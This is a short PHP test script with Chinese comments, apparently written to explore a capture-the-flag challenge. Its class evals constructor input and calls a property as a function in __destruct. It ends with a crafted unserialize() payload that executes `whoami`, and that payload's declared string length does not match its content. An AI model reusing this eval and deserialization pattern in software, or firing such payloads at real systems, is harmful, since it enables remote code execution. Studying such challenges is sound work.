<?php
// 关键发现：在 __construct 中，赋值顺序是：
// 1. $this->a = $a;
// 2. $this->b = $b;
// 3. check($a, $b);
// 4. eval($a . $b);

// 所以即使 eval 中修改了 $this->a，它已经被设置过了！
// 除非... eval 再次修改它

// 测试本地模拟
class FLAG
{
    public $a;
    public $b;

    public function __construct($a, $b)
    {
        $this->a = $a;
        $this->b = $b;
        echo "Before eval: \$this->a = '{$this->a}', \$this->b = '{$this->b}'\n";
        eval ($a . $b);
        echo "After eval: \$this->a = '{$this->a}', \$this->b = '{$this->b}'\n";
    }

    public function __destruct()
    {
        $a = (string) $this->a;
        $b = (string) $this->b;
        echo "__destruct: \$a = '$a', \$b = '$b'\n";
        if ($a !== "") {
            echo "Would call: $a('', '$b')\n";
        } else {
            echo "Error: \$a is empty, cannot call as function!\n";
        }
    }
}

echo "=== 测试 1: 基本调用 ===\n";
$obj = new FLAG("", ";echo 'First construct'.'\\n';");
echo "对象创建完成\n";
unset($obj);
echo "对象已销毁\n";

echo "\n=== 测试 2: 在 eval 中用复杂方法修改属性 ===\n";
// 我们不能直接用 $this，但可以用其他方法

// 方法：用变量引用
// 但是需要先获取对象引用...

// 或者！用 extract() + get_defined_vars()
// 但这些都有被过滤的字符

// 或者用 compact()
// 也有被过滤字符

// 最简单：接受第二次报错，但在报错前已经输出了 flag
echo "让我们直接测试看看第二次是否真的会报错:\n\n";

$test_obj = unserialize('O:4:"FLAG":2:{s:1:"a";s:4:"FLAG";s:1:"b";s:22:";var_dump(`whoami`);";}');
echo "\n程序结束\n";
